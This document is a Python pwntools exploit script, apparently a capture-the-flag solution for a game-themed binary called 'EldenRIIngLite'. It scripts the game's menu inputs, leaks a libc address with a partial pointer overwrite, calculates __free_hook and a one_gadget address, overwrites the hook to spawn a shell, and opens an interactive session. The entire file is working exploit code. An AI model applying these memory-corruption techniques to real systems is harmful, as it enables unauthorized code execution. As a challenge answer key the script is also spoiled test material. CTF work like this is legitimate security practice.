#!/usr/bin/env python3
from pwn import *

context.update(arch='amd64')
exe = './EldenRIIngLite'
with context.quiet:
    libc = ELF(exe).libc

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def beat_first_boss(io: process) -> None:
    io.sendlineafter(b'name? : ', b'RII')
    io.sendlineafter(b'departing?\n: ', b'RII')
    io.sendlineafter(b'strike\n: ', b'2')
    io.sendlineafter(b'Warden\n: ', b'3')
    io.sendlineafter(b'n): ', b'n') # Don't leave message yet

def beat_second_boss(io: process) -> tuple:
    io.sendlineafter(b'side\n: ', b'1')
    io.sendlineafter(b'him?\n: ', cyclic(16) + b'\xb0\x5f\x40') # Leak libc
    io.sendlineafter(b'emote\n: ', b'3')
    io.recvuntil(b'dropped ')
    leak_libc = int(io.recvuntil(b' runes').split()[0].decode())
    libc.address = leak_libc - libc.symbols['puts']
    free_hook = libc.address + 0x1eee48
    magic_gadget = libc.address + 0xe3b01
    return free_hook, magic_gadget

def beat_third_boss(io: process) -> None:
    io.sendlineafter(b'Aethelwulf\n: ', b'2')
    io.sendlineafter(b'hit\n: ', b'2')
    io.sendlineafter(b' : ', b'y') # NG+

def exploit(io: process, free_hook: int, magic_gadget: int) -> None:
    io.sendlineafter(b'departing?\n: ', b'\x00' * 14 + b'\x02\x00' + b'\x00' * 0xa8 + p64(free_hook))
    io.sendlineafter(b'strike\n: ', b'2')
    io.sendlineafter(b'Warden\n: ', b'3')
    io.sendlineafter(b'n): ', b'y')
    io.sendlineafter(b'message: ', p64(magic_gadget)) # Perform exploit
  

gdbscript = '''
b *0x4015ba
continue
'''.format(**locals())

with context.quiet:
    io = start()

beat_first_boss(io)
free_hook, magic_gadget = beat_second_boss(io)
beat_third_boss(io)
exploit(io, free_hook, magic_gadget)

io.interactive()

